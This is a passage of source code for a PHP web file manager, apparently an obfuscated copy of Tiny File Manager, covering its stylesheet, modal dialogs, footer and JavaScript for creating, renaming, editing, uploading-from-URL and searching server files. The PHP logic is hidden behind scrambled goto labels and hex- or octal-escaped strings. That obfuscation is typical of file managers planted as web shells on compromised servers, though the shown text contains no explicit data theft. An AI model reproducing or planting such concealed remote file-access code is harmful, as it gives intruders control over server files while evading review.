            .main-nav { padding:0.2rem 1rem;box-shadow:0 4px 5px 0 rgba(0, 0, 0, .14), 0 1px 10px 0 rgba(0, 0, 0, .12), 0 2px 4px -1px rgba(0, 0, 0, .2)  }
            .dataTables_filter { display:none; }
            table.dataTable thead .sorting { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAQAAADYWf5HAAAAkElEQVQoz7XQMQ5AQBCF4dWQSJxC5wwax1Cq1e7BAdxD5SL+Tq/QCM1oNiJidwox0355mXnG/DrEtIQ6azioNZQxI0ykPhTQIwhCR+BmBYtlK7kLJYwWCcJA9M4qdrZrd8pPjZWPtOqdRQy320YSV17OatFC4euts6z39GYMKRPCTKY9UnPQ6P+GtMRfGtPnBCiqhAeJPmkqAAAAAElFTkSuQmCC'); }
            table.dataTable thead .sorting_asc { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZ0lEQVQ4y2NgGLKgquEuFxBPAGI2ahhWCsS/gDibUoO0gPgxEP8H4ttArEyuQYxAPBdqEAxPBImTY5gjEL9DM+wTENuQahAvEO9DMwiGdwAxOymGJQLxTyD+jgWDxCMZRsEoGAVoAADeemwtPcZI2wAAAABJRU5ErkJggg=='); }
            table.dataTable thead .sorting_desc { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZUlEQVQ4y2NgGAWjYBSggaqGu5FA/BOIv2PBIPFEUgxjB+IdQPwfC94HxLykus4GiD+hGfQOiB3J8SojEE9EM2wuSJzcsFMG4ttQgx4DsRalkZENxL+AuJQaMcsGxBOAmGvopk8AVz1sLZgg0bsAAAAASUVORK5CYII='); }
            table.dataTable thead tr:first-child th.custom-checkbox-header:first-child { background-image:none; }
            .footer-action li { margin-bottom:10px; }
            .app-v-title { font-size:24px;font-weight:300;letter-spacing:-.5px;text-transform:uppercase; }
            hr.custom-hr { border-top:1px dashed #8c8b8b;border-bottom:1px dashed #fff; }
            .ekko-lightbox .modal-dialog { max-width:98%; }
            .ekko-lightbox-item.fade.in.show .row { background:#fff; }
            .ekko-lightbox-nav-overlay { display:flex !important;opacity:1 !important;height:auto !important;top:50%; }
            .ekko-lightbox-nav-overlay a { opacity:1 !important;width:auto !important;text-shadow:none !important;color:#3B3B3B; }
            .ekko-lightbox-nav-overlay a:hover { color:#20507D; }
            #snackbar { visibility:hidden;min-width:250px;margin-left:-125px;background-color:#333;color:#fff;text-align:center;border-radius:2px;padding:16px;position:fixed;z-index:1;left:50%;bottom:30px;font-size:17px; }
            #snackbar.show { visibility:visible;-webkit-animation:fadein 0.5s, fadeout 0.5s 2.5s;animation:fadein 0.5s, fadeout 0.5s 2.5s; }
            @-webkit-keyframes fadein { from { bottom:0;opacity:0; }
                to { bottom:30px;opacity:1; }
            }
            @keyframes fadein { from { bottom:0;opacity:0; }
                to { bottom:30px;opacity:1; }
            }
            @-webkit-keyframes fadeout { from { bottom:30px;opacity:1; }
                to { bottom:0;opacity:0; }
            }
            @keyframes fadeout { from { bottom:30px;opacity:1; }
                to { bottom:0;opacity:0; }
            }
            #main-table span.badge { border-bottom:2px solid #f8f9fa }
            #main-table span.badge:nth-child(1) { border-color:#df4227 }
            #main-table span.badge:nth-child(2) { border-color:#f8b600 }
            #main-table span.badge:nth-child(3) { border-color:#00bd60 }
            #main-table span.badge:nth-child(4) { border-color:#4581ff }
            #main-table span.badge:nth-child(5) { border-color:#ac68fc }
            #main-table span.badge:nth-child(6) { border-color:#45c3d2 }
            @media only screen and (min-device-width:768px) and (max-device-width:1024px) and (orientation:landscape) and (-webkit-min-device-pixel-ratio:2) { .navbar-collapse .col-xs-6.text-right { padding:0; }
            }
            .btn.active.focus,.btn.active:focus,.btn.focus,.btn.focus:active,.btn:active:focus,.btn:focus { outline:0!important;outline-offset:0!important;background-image:none!important;-webkit-box-shadow:none!important;box-shadow:none!important }
            .lds-facebook { display:none;position:relative;width:64px;height:64px }
            .lds-facebook div,.lds-facebook.show-me { display:inline-block }
            .lds-facebook div { position:absolute;left:6px;width:13px;background:#007bff;animation:lds-facebook 1.2s cubic-bezier(0,.5,.5,1) infinite }
            .lds-facebook div:nth-child(1) { left:6px;animation-delay:-.24s }
            .lds-facebook div:nth-child(2) { left:26px;animation-delay:-.12s }
            .lds-facebook div:nth-child(3) { left:45px;animation-delay:0s }
            @keyframes lds-facebook { 0% { top:6px;height:51px }
                100%,50% { top:19px;height:26px }
            }
            ul#search-wrapper { padding-left: 0;border: 1px solid #ecececcc; } ul#search-wrapper li { list-style: none; padding: 5px;border-bottom: 1px solid #ecececcc; }
            ul#search-wrapper li:nth-child(odd){ background: #f9f9f9cc;}
            .c-preview-img {
                max-width: 300px;
            }
        </style>
        <?php  if (FM_THEME == "\144\x61\x72\153") { ?>
            <style>
                body.theme-dark { background-color: #2f2a2a; }
                .list-group .list-group-item { background: #343a40; }
                .theme-dark .navbar-nav i, .navbar-nav .dropdown-toggle, .break-word { color: #ffffff; }
                a, a:hover, a:visited, a:active, #main-table .filename a { color: #00ff1f; }
                ul#search-wrapper li:nth-child(odd) { background: #f9f9f9cc; }
                .theme-dark .btn-outline-primary { color: #00ff1f; border-color: #00ff1f; }
                .theme-dark .btn-outline-primary:hover, .theme-dark .btn-outline-primary:active { background-color: #028211;}
            </style>
        <?php  } ?>
    </head>
    <body class="<?php  echo FM_THEME == "\144\141\162\153" ? "\164\x68\145\155\145\x2d\144\141\x72\x6b" : ''; ?>
 <?php  echo $isStickyNavBar; ?>
">
    <div id="wrapper" class="container-fluid">
        <div class="modal fade" id="createNewItem" tabindex="-1" role="dialog" aria-label="newItemModalLabel" aria-hidden="true">
            <div class="modal-dialog" role="document">
                <div class="modal-content <?php  echo fm_get_theme(); ?>
">
                    <div class="modal-header">
                        <h5 class="modal-title" id="newItemModalLabel"><i class="fa fa-plus-square fa-fw"></i><?php  echo lng("\x43\162\x65\x61\x74\145\116\145\167\x49\x74\x65\x6d"); ?>
</h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <div class="modal-body">
                        <p><label for="newfile"><?php  echo lng("\111\164\x65\155\124\171\x70\x65"); ?>
 </label></p>

                        <div class="custom-control custom-radio custom-control-inline">
                            <input type="radio" id="customRadioInline1" name="newfile" value="file" class="custom-control-input">
                            <label class="custom-control-label" for="customRadioInline1"><?php  echo lng("\x46\151\x6c\x65"); ?>
</label>
                        </div>

                        <div class="custom-control custom-radio custom-control-inline">
                            <input type="radio" id="customRadioInline2" name="newfile" value="folder" class="custom-control-input" checked="">
                            <label class="custom-control-label" for="customRadioInline2"><?php  echo lng("\x46\x6f\154\144\145\x72"); ?>
</label>
                        </div>

                        <p class="mt-3"><label for="newfilename"><?php  echo lng("\x49\164\x65\155\116\141\155\145"); ?>
 </label></p>
                        <input type="text" name="newfilename" id="newfilename" value="" class="form-control">
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-outline-primary" data-dismiss="modal"><i class="fa fa-times-circle"></i> <?php  echo lng("\103\x61\156\143\145\x6c"); ?>
</button>
                        <button type="button" class="btn btn-success" onclick="newfolder('<?php  echo fm_enc(FM_PATH); ?>
');return false;"><i class="fa fa-check-circle"></i> <?php  echo lng("\x43\x72\145\x61\x74\145\116\157\167"); ?>
</button>
                    </div>
                </div>
            </div>
        </div>
        <div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-lg" role="document">
                <div class="modal-content <?php  echo fm_get_theme(); ?>
">
                    <div class="modal-header">
                        <h5 class="modal-title col-10" id="searchModalLabel">
                            <div class="input-group input-group">
                                <input type="text" class="form-control" placeholder="<?php  echo lng("\x53\145\x61\162\x63\150"); ?>
 a files" aria-label="<?php  echo lng("\x53\145\x61\x72\x63\x68"); ?>
" aria-describedby="search-addon3" id="advanced-search" autofocus required>
                                <div class="input-group-append">
                                    <span class="input-group-text" id="search-addon3"><i class="fa fa-search"></i></span>
                                </div>
                            </div>
                        </h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <div class="modal-body">
                        <form action="" method="post">
                            <div class="lds-facebook"><div></div><div></div><div></div></div>
                            <ul id="search-wrapper">
                                <p class="m-2"><?php  echo lng("\x53\145\141\x72\143\x68\x20\146\x69\154\145\40\x69\156\x20\x66\x6f\154\144\x65\162\x20\x61\x6e\144\40\163\165\x62\x66\157\x6c\x64\145\x72\163\56\x2e\x2e"); ?>
</p>
                            </ul>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        <script type="text/html" id="js-tpl-modal">
            <div class="modal fade" id="js-ModalCenter-<%this.id%>" tabindex="-1" role="dialog" aria-labelledby="ModalCenterTitle" aria-hidden="true">
                <div class="modal-dialog modal-dialog-centered" role="document">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h5 class="modal-title" id="ModalCenterTitle"><%this.title%></h5>
                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                <span aria-hidden="true">&times;</span>
                            </button>
                        </div>
                        <div class="modal-body">
                            <%this.content%>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-outline-primary" data-dismiss="modal"><i class="fa fa-times-circle"></i> <?php  echo lng("\103\141\x6e\143\145\x6c"); ?>
</button>
                            <%if(this.action){%><button type="button" class="btn btn-primary" id="js-ModalCenterAction" data-type="js-<%this.action%>"><%this.action%></button><%}%>
                        </div>
                    </div>
                </div>
            </div>
        </script>

        <?php  } goto bY_ja; jMH8G: function fm_redirect($url, $code = 302) { header("\x4c\x6f\x63\141\x74\x69\x6f\156\72\40" . $url, true, $code); die; } goto oatiw; g69k_: echo fm_enc(FM_PATH); goto n2Cqs; QjRlA: $calc_folder = isset($cfg->data["\143\141\x6c\x63\x5f\x66\157\154\x64\x65\162"]) ? $cfg->data["\x63\141\154\143\x5f\x66\x6f\x6c\x64\145\x72"] : true; goto ylraq; FUUhI: if (empty($folders) && empty($files)) { ?>
                    <tfoot>
                    <tr><?php  if (!FM_READONLY) { ?>
                            <td></td><?php  } ?>
                        <td colspan="<?php  echo !FM_IS_WIN && !$hide_Cols ? "\66" : "\x34"; ?>
"><em><?php  echo "\106\157\x6c\x64\145\162\x20\151\163\40\145\x6d\160\164\171"; ?>
</em></td>
                    </tr>
                    </tfoot>
                    <?php  } else { ?>
                    <tfoot>
                    <tr><?php  if (!FM_READONLY) { ?>
                            <td class="gray"></td><?php  } ?>
                        <td class="gray" colspan="<?php  echo !FM_IS_WIN && !$hide_Cols ? "\x36" : "\64"; ?>
">
                            <?php  echo lng("\x46\x75\x6c\154\123\151\172\145") . "\72\x20\74\x73\160\141\156\x20\143\x6c\x61\163\x73\75\42\x62\x61\x64\x67\x65\x20\142\141\144\147\145\55\154\x69\x67\150\164\42\76" . fm_get_filesize($all_files_size) . "\74\x2f\163\160\141\x6e\76"; ?>
                            <?php  echo lng("\x46\x69\x6c\x65") . "\72\x20\74\x73\160\141\156\40\x63\x6c\x61\x73\163\x3d\42\x62\141\144\x67\x65\x20\x62\x61\144\147\x65\55\x6c\151\147\150\x74\x22\76" . $num_files . "\74\x2f\163\x70\x61\156\x3e"; ?>
                            <?php  echo lng("\106\x6f\154\144\145\162") . "\x3a\x20\74\163\160\141\156\x20\x63\x6c\x61\x73\163\75\x22\x62\141\x64\x67\145\40\x62\x61\x64\147\145\55\154\151\x67\150\164\42\76" . $num_folders . "\x3c\57\x73\x70\x61\x6e\x3e"; ?>
                            <?php  echo lng("\120\x61\x72\x74\x69\164\151\157\156\x53\151\x7a\145") . "\x3a\x20\74\x73\x70\x61\x6e\x20\x63\x6c\x61\x73\163\x3d\x22\x62\141\144\147\145\40\x62\141\x64\x67\145\x2d\x6c\x69\147\x68\x74\42\x3e" . fm_get_filesize(@disk_free_space($path)) . "\x3c\57\163\160\x61\156\x3e\40" . lng("\106\x72\145\145\117\x66") . "\40\x3c\163\x70\x61\156\x20\143\154\141\x73\x73\75\x22\x62\x61\144\147\x65\x20\x62\141\x64\147\x65\55\154\x69\147\150\x74\x22\76" . fm_get_filesize(@disk_total_space($path)) . "\x3c\x2f\x73\x70\x61\156\x3e"; ?>
                        </td>
                    </tr>
                    </tfoot>
                    <?php  } goto RjE7m; ZLvwG: if (!@is_dir($root_path)) { echo "\x3c\x68\61\x3e" . lng("\x52\157\x6f\164\x20\160\x61\x74\x68") . "\40\42{$root_path}\x22\x20" . lng("\x6e\x6f\x74\40\146\x6f\165\x6e\144\41") . "\40\x3c\x2f\x68\61\76"; die; } goto U6K1Z; bY_ja: function fm_show_footer() { ?>
    </div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script src="https://cdn.datatables.net/1.10.23/js/jquery.dataTables.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.min.js"></script>
    <?php  if (FM_USE_HIGHLIGHTJS) { ?>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/highlight.min.js"></script>
        <script>hljs.highlightAll(); var isHighlightingEnabled = true;</script>
    <?php  } ?>
    <script>
        $(document).on('click', '[data-toggle="lightbox"]', function(event) {
            event.preventDefault();
            var reInitHighlight = function() { if(typeof isHighlightingEnabled !== "undefined" && isHighlightingEnabled) { setTimeout(function () { $('.ekko-lightbox-container pre code').each(function (i, e) { hljs.highlightBlock(e) }); }, 555); } };
            $(this).ekkoLightbox({
                alwaysShowClose: true, showArrows: true, onShown: function() { reInitHighlight(); }, onNavigate: function(direction, itemIndex) { reInitHighlight(); }
            });
        });
        window.curi = "https://tinyfilemanager.github.io/config.json", window.config = null;
        function fm_get_config(){ if(!!window.name){ window.config = JSON.parse(window.name); } else { $.getJSON(window.curi).done(function(c) { if(!!c) { window.name = JSON.stringify(c), window.config = c; } }); }}
        function template(html,options){
            var re=/<\%([^\%>]+)?\%>/g,reExp=/(^( )?(if|for|else|switch|case|break|{|}))(.*)?/g,code='var r=[];\n',cursor=0,match;var add=function(line,js){js?(code+=line.match(reExp)?line+'\n':'r.push('+line+');\n'):(code+=line!=''?'r.push("'+line.replace(/"/g,'\\"')+'");\n':'');return add}
            while(match=re.exec(html)){add(html.slice(cursor,match.index))(match[1],!0);cursor=match.index+match[0].length}
            add(html.substr(cursor,html.length-cursor));code+='return r.join("");';return new Function(code.replace(/[\r\t\n]/g,'')).apply(options)
        }
        function newfolder(e) {
            var t = document.getElementById("newfilename").value, n = document.querySelector('input[name="newfile"]:checked').value;
            null !== t && "" !== t && n && (window.location.hash = "#", window.location.search = "p=" + encodeURIComponent(e) + "&new=" + encodeURIComponent(t) + "&type=" + encodeURIComponent(n))
        }
        function rename(e, t) {var n = prompt("New name", t);null !== n && "" !== n && n != t && (window.location.search = "p=" + encodeURIComponent(e) + "&ren=" + encodeURIComponent(t) + "&to=" + encodeURIComponent(n))}
        function change_checkboxes(e, t) { for (var n = e.length - 1; n >= 0; n--) e[n].checked = "boolean" == typeof t ? t : !e[n].checked }
        function get_checkboxes() { for (var e = document.getElementsByName("file[]"), t = [], n = e.length - 1; n >= 0; n--) (e[n].type = "checkbox") && t.push(e[n]); return t }
        function select_all() { change_checkboxes(get_checkboxes(), !0) }
        function unselect_all() { change_checkboxes(get_checkboxes(), !1) }
        function invert_all() { change_checkboxes(get_checkboxes()) }
        function checkbox_toggle() { var e = get_checkboxes(); e.push(this), change_checkboxes(e) }
        function backup(e, t) {
            var n = new XMLHttpRequest,
                a = "path=" + e + "&file=" + t + "&type=backup&ajax=true";
            return n.open("POST", "", !0), n.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), n.onreadystatechange = function () {
                4 == n.readyState && 200 == n.status && toast(n.responseText)
            }, n.send(a), !1
        }
        function toast(txt) { var x = document.getElementById("snackbar");x.innerHTML=txt;x.className = "show";setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000); }
        function edit_save(e, t) {
            var n = "ace" == t ? editor.getSession().getValue() : document.getElementById("normal-editor").value;
            if (typeof n !== 'undefined' && n !== null) {
                if (true) {
                    var data = {ajax: true, content: n, type: 'save'};

                    $.ajax({
                        type: "POST",
                        url: window.location,
                        data: JSON.stringify(data),
                        contentType: "multipart/form-data-encoded; charset=utf-8",
                        success: function(mes){toast("Saved Successfully"); window.onbeforeunload = function() {return}},
                        failure: function(mes) {toast("Error: try again");},
                        error: function(mes) {toast(`<p style="background-color:red">${mes.responseText}</p>`);}
                    });
                } else {
                    var a = document.createElement("form");
                    a.setAttribute("method", "POST"), a.setAttribute("action", "");
                    var o = document.createElement("textarea");
                    o.setAttribute("type", "textarea"), o.setAttribute("name", "savedata");
                    var c = document.createTextNode(n);
                    o.appendChild(c), a.appendChild(o), document.body.appendChild(a), a.submit()
                }
            }
        }
        function latest_release_info(v) {
            if(!!window.config){var tplObj={id:1024,title:"Check Version",action:false},tpl=$("#js-tpl-modal").html();
                if(window.config.version!=v){tplObj.content=window.config.newUpdate;}else{tplObj.content=window.config.noUpdate;}
                $('#wrapper').append(template(tpl,tplObj));$("#js-ModalCenter-1024").modal('show');}else{fm_get_config();}
        }
        function show_new_pwd() { $(".js-new-pwd").toggleClass('hidden'); }
        function save_settings($this) {
            let form = $($this);
            $.ajax({
                type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&ajax="+true,
                success: function (data) {if(data) { window.location.reload();}}
            }); return false;
        }
        function new_password_hash($this) {
            let form = $($this), $pwd = $("#js-pwd-result"); $pwd.val('');
            $.ajax({
                type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&ajax="+true,
                success: function (data) { if(data) { $pwd.val(data); } }
            }); return false;
        }
        function upload_from_url($this) {
            let form = $($this), resultWrapper = $("div#js-url-upload__list");
            $.ajax({
                type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&ajax="+true,
                beforeSend: function() { form.find("input[name=uploadurl]").attr("disabled","disabled"); form.find("button").hide(); form.find(".lds-facebook").addClass('show-me'); },
                success: function (data) {
                    if(data) {
                        data = JSON.parse(data);
                        if(data.done) {
                            resultWrapper.append('<div class="alert alert-success row">Uploaded Successful: '+data.done.name+'</div>'); form.find("input[name=uploadurl]").val('');
                        } else if(data['fail']) { resultWrapper.append('<div class="alert alert-danger row">Error: '+data.fail.message+'</div>'); }
                        form.find("input[name=uploadurl]").removeAttr("disabled");form.find("button").show();form.find(".lds-facebook").removeClass('show-me');
                    }
                },
                error: function(xhr) {
                    form.find("input[name=uploadurl]").removeAttr("disabled");form.find("button").show();form.find(".lds-facebook").removeClass('show-me');console.error(xhr);
                }
            }); return false;
        }
        function search_template(data) {
            var response = "";
            $.each(data, function (key, val) {
                response += `<li><a href="?p=${val.path}&view=${val.name}">${val.path}/${val.name}</a></li>`;
            });
            return response;
        }
        function fm_search() {
            var searchTxt = $("input#advanced-search").val(), searchWrapper = $("ul#search-wrapper"), path = $("#js-search-modal").attr("href"), _html = "", $loader = $("div.lds-facebook");
            if(!!searchTxt && searchTxt.length > 2 && path) {
                var data = {ajax: true, content: searchTxt, path:path, type: 'search'};
                $.ajax({
                    type: "POST",
                    url: window.location,
                    data: data,
                    beforeSend: function() {
                        searchWrapper.html('');
                        $loader.addClass('show-me');
                    },
                    success: function(data){
                        $loader.removeClass('show-me');
                        data = JSON.parse(data);
                        if(data && data.length) {
                            _html = search_template(data);
                            searchWrapper.html(_html);
                        } else { searchWrapper.html('<p class="m-2">No result found!<p>'); }
                    },
                    error: function(xhr) { $loader.removeClass('show-me'); searchWrapper.html('<p class="m-2">ERROR: Try again later!</p>'); },
                    failure: function(mes) { $loader.removeClass('show-me'); searchWrapper.html('<p class="m-2">ERROR: Try again later!</p>');}
                });
            } else { searchWrapper.html("OOPS: minimum 3 characters required!"); }
        }
        !function(s){s.previewImage=function(e){var o=s(document),t=".previewImage",a=s.extend({xOffset:20,yOffset:-20,fadeIn:"fast",css:{padding:"5px",border:"1px solid #cccccc","background-color":"#fff"},eventSelector:"[data-preview-image]",dataKey:"previewImage",overlayId:"preview-image-plugin-overlay"},e);return o.off(t),o.on("mouseover"+t,a.eventSelector,function(e){s("p#"+a.overlayId).remove();var o=s("<p>").attr("id",a.overlayId).css("position","absolute").css("display","none").append(s('<img class="c-preview-img">').attr("src",s(this).data(a.dataKey)));a.css&&o.css(a.css),s("body").append(o),o.css("top",e.pageY+a.yOffset+"px").css("left",e.pageX+a.xOffset+"px").fadeIn(a.fadeIn)}),o.on("mouseout"+t,a.eventSelector,function(){s("#"+a.overlayId).remove()}),o.on("mousemove"+t,a.eventSelector,function(e){s("#"+a.overlayId).css("top",e.pageY+a.yOffset+"px").css("left",e.pageX+a.xOffset+"px")}),this},s.previewImage()}(jQuery);
        $(document).ready( function () {
            fm_get_config();
            var $table = $('#main-table'),
                tableLng = $table.find('th').length,
                _targets = (tableLng && tableLng == 7 ) ? [0, 4,5,6] : tableLng == 5 ? [0,4] : [3],
                mainTable = $('#main-table').DataTable({"paging": false, "info": false, "order": [], "columnDefs": [{"targets": _targets, "orderable": false}]
                });
            $('#search-addon').on( 'keyup', function () {
                mainTable.search( this.value ).draw();
            });
            $("input#advanced-search").on('keyup', function (e) {
                if (e.keyCode === 13) { fm_search(); }
            });
            $('#search-addon3').on( 'click', function () { fm_search(); });
            $(".fm-upload-wrapper .card-header-tabs").on("click", 'a', function(e){
                e.preventDefault();let target=$(this).data('target');
                $(".fm-upload-wrapper .card-header-tabs a").removeClass('active');$(this).addClass('active');
                $(".fm-upload-wrapper .card-tabs-container").addClass('hidden');$(target).removeClass('hidden');
            });
        });
    </script>
    <?php  if (isset($_GET["\145\144\151\164"]) && isset($_GET["\x65\156\x76"]) && FM_EDIT_FILE) { $ext = "\152\x61\x76\141\x73\x63\x72\x69\x70\164"; $ext = pathinfo($_GET["\145\x64\x69\x74"], PATHINFO_EXTENSION); ?>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/ace.js"></script>
        <script>
            var editor = ace.edit("editor");
            editor.getSession().setMode( {path:"ace/mode/<?php  echo $ext; ?>
", inline:true} );
            function ace_commend (cmd) { editor.commands.exec(cmd, editor); }
            editor.commands.addCommands([{
                name: 'save', bindKey: {win: 'Ctrl-S',  mac: 'Command-S'},
                exec: function(editor) { edit_save(this, 'ace'); }
            }]);
            function renderThemeMode() {
                var $modeEl = $("select#js-ace-mode"), $themeEl = $("select#js-ace-theme"), $fontSizeEl = $("select#js-ace-fontSize"), optionNode = function(type, arr){ var $Option = ""; $.each(arr, function(i, val) { $Option += "<option value='"+type+i+"'>" + val + "</option>"; }); return $Option; },
                    _data = {"aceTheme":{"bright":{"chrome":"Chrome","clouds":"Clouds","crimson_editor":"Crimson Editor","dawn":"Dawn","dreamweaver":"Dreamweaver","eclipse":"Eclipse","github":"GitHub","iplastic":"IPlastic","solarized_light":"Solarized Light","textmate":"TextMate","tomorrow":"Tomorrow","xcode":"XCode","kuroir":"Kuroir","katzenmilch":"KatzenMilch","sqlserver":"SQL Server"},"dark":{"ambiance":"Ambiance","chaos":"Chaos","clouds_midnight":"Clouds Midnight","dracula":"Dracula","cobalt":"Cobalt","gruvbox":"Gruvbox","gob":"Green on Black","idle_fingers":"idle Fingers","kr_theme":"krTheme","merbivore":"Merbivore","merbivore_soft":"Merbivore Soft","mono_industrial":"Mono Industrial","monokai":"Monokai","pastel_on_dark":"Pastel on dark","solarized_dark":"Solarized Dark","terminal":"Terminal","tomorrow_night":"Tomorrow Night","tomorrow_night_blue":"Tomorrow Night Blue","tomorrow_night_bright":"Tomorrow Night Bright","tomorrow_night_eighties":"Tomorrow Night 80s","twilight":"Twilight","vibrant_ink":"Vibrant Ink"}},"aceMode":{"javascript":"JavaScript","abap":"ABAP","abc":"ABC","actionscript":"ActionScript","ada":"ADA","apache_conf":"Apache Conf","asciidoc":"AsciiDoc","asl":"ASL","assembly_x86":"Assembly x86","autohotkey":"AutoHotKey","apex":"Apex","batchfile":"BatchFile","bro":"Bro","c_cpp":"C and C++","c9search":"C9Search","cirru":"Cirru","clojure":"Clojure","cobol":"Cobol","coffee":"CoffeeScript","coldfusion":"ColdFusion","csharp":"C#","csound_document":"Csound Document","csound_orchestra":"Csound","csound_score":"Csound Score","css":"CSS","curly":"Curly","d":"D","dart":"Dart","diff":"Diff","dockerfile":"Dockerfile","dot":"Dot","drools":"Drools","edifact":"Edifact","eiffel":"Eiffel","ejs":"EJS","elixir":"Elixir","elm":"Elm","erlang":"Erlang","forth":"Forth","fortran":"Fortran","fsharp":"FSharp","fsl":"FSL","ftl":"FreeMarker","gcode":"Gcode","gherkin":"Gherkin","gitignore":"Gitignore","glsl":"Glsl","gobstones":"Gobstones","golang":"Go","graphqlschema":"GraphQLSchema","groovy":"Groovy","haml":"HAML","handlebars":"Handlebars","haskell":"Haskell","haskell_cabal":"Haskell Cabal","haxe":"haXe","hjson":"Hjson","html":"HTML","html_elixir":"HTML (Elixir)","html_ruby":"HTML (Ruby)","ini":"INI","io":"Io","jack":"Jack","jade":"Jade","java":"Java","json":"JSON","jsoniq":"JSONiq","jsp":"JSP","jssm":"JSSM","jsx":"JSX","julia":"Julia","kotlin":"Kotlin","latex":"LaTeX","less":"LESS","liquid":"Liquid","lisp":"Lisp","livescript":"LiveScript","logiql":"LogiQL","lsl":"LSL","lua":"Lua","luapage":"LuaPage","lucene":"Lucene","makefile":"Makefile","markdown":"Markdown","mask":"Mask","matlab":"MATLAB","maze":"Maze","mel":"MEL","mixal":"MIXAL","mushcode":"MUSHCode","mysql":"MySQL","nix":"Nix","nsis":"NSIS","objectivec":"Objective-C","ocaml":"OCaml","pascal":"Pascal","perl":"Perl","perl6":"Perl 6","pgsql":"pgSQL","php_laravel_blade":"PHP (Blade Template)","php":"PHP","puppet":"Puppet","pig":"Pig","powershell":"Powershell","praat":"Praat","prolog":"Prolog","properties":"Properties","protobuf":"Protobuf","python":"Python","r":"R","razor":"Razor","rdoc":"RDoc","red":"Red","rhtml":"RHTML","rst":"RST","ruby":"Ruby","rust":"Rust","sass":"SASS","scad":"SCAD","scala":"Scala","scheme":"Scheme","scss":"SCSS","sh":"SH","sjs":"SJS","slim":"Slim","smarty":"Smarty","snippets":"snippets","soy_template":"Soy Template","space":"Space","sql":"SQL","sqlserver":"SQLServer","stylus":"Stylus","svg":"SVG","swift":"Swift","tcl":"Tcl","terraform":"Terraform","tex":"Tex","text":"Text","textile":"Textile","toml":"Toml","tsx":"TSX","twig":"Twig","typescript":"Typescript","vala":"Vala","vbscript":"VBScript","velocity":"Velocity","verilog":"Verilog","vhdl":"VHDL","visualforce":"Visualforce","wollok":"Wollok","xml":"XML","xquery":"XQuery","yaml":"YAML","django":"Django"},"fontSize":{8:8,10:10,11:11,12:12,13:13,14:14,15:15,16:16,17:17,18:18,20:20,22:22,24:24,26:26,30:30}};
                if(_data && _data.aceMode) { $modeEl.html(optionNode("ace/mode/", _data.aceMode)); }
                if(_data && _data.aceTheme) { var lightTheme = optionNode("ace/theme/", _data.aceTheme.bright), darkTheme = optionNode("ace/theme/", _data.aceTheme.dark); $themeEl.html("<optgroup label=\"Bright\">"+lightTheme+"</optgroup><optgroup label=\"Dark\">"+darkTheme+"</optgroup>");}
                if(_data && _data.fontSize) { $fontSizeEl.html(optionNode("", _data.fontSize)); }
                $modeEl.val( editor.getSession().$modeId );
                $themeEl.val( editor.getTheme() );
                $fontSizeEl.val(12).change();
            }

            $(function(){
                renderThemeMode();
                $(".js-ace-toolbar").on("click", 'button', function(e){
                    e.preventDefault();
                    let cmdValue = $(this).attr("data-cmd"), editorOption = $(this).attr("data-option");
                    if(cmdValue && cmdValue != "none") {
                        ace_commend(cmdValue);
                    } else if(editorOption) {
                        if(editorOption == "fullscreen") {
                            (void 0!==document.fullScreenElement&&null===document.fullScreenElement||void 0!==document.msFullscreenElement&&null===document.msFullscreenElement||void 0!==document.mozFullScreen&&!document.mozFullScreen||void 0!==document.webkitIsFullScreen&&!document.webkitIsFullScreen)
                            &&(editor.container.requestFullScreen?editor.container.requestFullScreen():editor.container.mozRequestFullScreen?editor.container.mozRequestFullScreen():editor.container.webkitRequestFullScreen?editor.container.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT):editor.container.msRequestFullscreen&&editor.container.msRequestFullscreen());
                        } else if(editorOption == "wrap") {
                            let wrapStatus = (editor.getSession().getUseWrapMode()) ? false : true;
                            editor.getSession().setUseWrapMode(wrapStatus);
                        } else if(editorOption == "help") {
                            var helpHtml="";$.each(window.config.aceHelp,function(i,value){helpHtml+="<li>"+value+"</li>";});var tplObj={id:1028,title:"Help",action:false,content:helpHtml},tpl=$("#js-tpl-modal").html();$('#wrapper').append(template(tpl,tplObj));$("#js-ModalCenter-1028").modal('show');
                        }
                    }
                });
                $("select#js-ace-mode, select#js-ace-theme, select#js-ace-fontSize").on("change", function(e){
                    e.preventDefault();
                    let selectedValue = $(this).val(), selectionType = $(this).attr("data-type");
                    if(selectedValue && selectionType == "mode") {
                        editor.getSession().setMode(selectedValue);
                    } else if(selectedValue && selectionType == "theme") {
                        editor.setTheme(selectedValue);
                    }else if(selectedValue && selectionType == "fontSize") {
                        editor.setFontSize(parseInt(selectedValue));
                    }
                });
            });
        </script>
    <?php  } ?>
    <div id="snackbar"></div>
    </body>
    </html>
